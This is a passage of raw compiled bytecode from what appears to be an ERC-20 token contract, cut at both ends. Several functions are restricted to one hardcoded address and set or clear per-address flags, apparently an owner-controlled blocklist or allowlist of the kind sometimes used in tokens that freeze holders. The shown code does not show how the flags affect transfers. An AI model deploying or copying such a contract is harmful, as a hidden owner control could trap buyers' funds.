31757610171565b806306fdde0314610175578063095ea7b31461019357806314606cfa146101c357806318160ddd146101e157806323b872dd146101ff5780632a0acc6a1461022f575b5f80fd5b61017d6104f3565b60405161018a91906118c5565b60405180910390f35b6101ad60048036038101906101a8919061197a565b610583565b6040516101ba91906119d2565b60405180910390f35b6101cb6105a5565b6040516101d891906119fa565b60405180910390f35b6101e96105bd565b6040516101f69190611a22565b60405180910390f35b61021960048036038101906102149190611a3b565b6105c6565b60405161022691906119d2565b60405180910390f35b6102376105f4565b60405161024491906119fa565b60405180910390f35b61025561060c565b6040516102629190611aa6565b60405180910390f35b61028560048036038101906102809190611abf565b610614565b60405161029291906119d2565b60405180910390f35b6102b560048036038101906102b0919061197a565b610631565b6040516102c291906119d2565b60405180910390f35b6102e560048036038101906102e0919061197a565b610667565b005b61030160048036038101906102fc9190611abf565b6106f7565b60405161030e9190611a22565b60405180910390f35b610331600480360381019061032c9190611abf565b61073c565b005b61034d60048036038101906103489190611b4b565b610815565b005b61036960048036038101906103649190611b4b565b610937565b005b610373610a5a565b60405161038091906118c5565b60405180910390f35b6103a3600480360381019061039e9190611abf565b610aea565b005b6103bf60048036038101906103ba919061197a565b610bc4565b6040516103cc91906119d2565b60405180910390f35b6103ef60048036038101906103ea919061197a565b610c39565b6040516103fc91906119d2565b60405180910390f35b61041f600480360381019061041a9190611b4b565b610c5b565b005b61043b60048036038101906104369190611abf565b610d7d565b60405161044891906119d2565b60405180910390f35b61046b60048036038101906104669190611b96565b610d9a565b6040516104789190611a22565b60405180910390f35b61049b60048036038101906104969190611abf565b610e1c565b005b6104b760048036038101906104b29190611b4b565b610ef5565b005b6104d360048036038101906104ce9190611abf565b611018565b005b6104dd6110f2565b6040516104ea9190611a22565b60405180910390f35b60606003805461050290611c01565b80601f016020809104026020016040519081016040528092919081815260200182805461052e90611c01565b80156105795780601f1061055057610100808354040283529160200191610579565b820191905f5260205f20905b81548152906001019060200180831161055c57829003601f168201915b5050505050905090565b5f8061058d6110fe565b905061059a818585611105565b600191505092915050565b735f5de6748149ee9d046e78d86b2352693700000081565b5f600254905090565b5f806105d06110fe565b90506105dd8582856112c8565b6105e8858585611353565b60019150509392505050565b73627f6e1887571ac08214315ad5b2fa7abb7345f181565b5f6012905090565b6006602052805f5260405f205f915054906101000a900460ff1681565b5f8061063b6110fe565b905061065c81858561064d8589610d9a565b6106579190611c5e565b611105565b600191505092915050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146106e9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106e090611cdb565b60405180910390fd5b6106f382826115bf565b5050565b5f805f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20549050919050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146107be576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107b590611cdb565b60405180910390fd5b5f60055f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff02191690831515021790555050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610897576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088e90611cdb565b60405180910390fd5b5f5b82829050811015610932575f60055f8585858181106108bb576108ba611cf9565b5b9050602002016020810190506108d09190611abf565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff021916908315150217905550808061092a90611d26565b915050610899565b505050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146109b9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109b090611cdb565b60405180910390fd5b5f5b82829050811015610a5557600160065f8585858181106109de576109dd611cf9565b5b9050602002016020810190506109f39190611abf565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff0219169083151502179055508080610a4d90611d26565b9150506109bb565b505050565b606060048054610a6990611c01565b80601f0160208091040260200160405190810160405280929190818152602001828054610a9590611c01565b8015610ae05780601f10610ab757610100808354040283529160200191610ae0565b820191905f5260205f20905b815481529060010190602001808311610ac357829003601f168201915b5050505050905090565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610b6c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b6390611cdb565b60405180910390fd5b600160065f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff02191690831515021790555050565b5f80610bce6110fe565b90505f610bdb8286610d9a565b905083811015610c20576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c1790611ddd565b60405180910390fd5b610c2d8286868403611105565b60019250505092915050565b5f80610c436110fe565b9050610c50818585611353565b600191505092915050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610cdd576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cd490611cdb565b60405180910390fd5b5f5b82829050811015610d78575f60065f858585818110610d0157610d00611cf9565b5b905060200201602081019050610d169190611abf565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff0219169083151502179055508080610d7090611d26565b915050610cdf565b505050565b6005602052805f5260405f205f915054906101000a900460ff1681565b5f60015f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054905092915050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610e9e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e9590611cdb565b60405180910390fd5b5f60065f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff02191690831515021790555050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610f77576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f6e90611cdb565b60405180910390fd5b5f5b8282905081101561101357600160055f858585818110610f9c57610f9b611cf9565b5b905060200201602081019050610fb19190611abf565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff021916908315150217905550808061100b90611d26565b915050610f79565b505050565b73627f6e1887571ac08214315ad5b2fa7abb7345f173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461109a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161109190611cdb565b60405180910390fd5b600160055f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff02191690831515
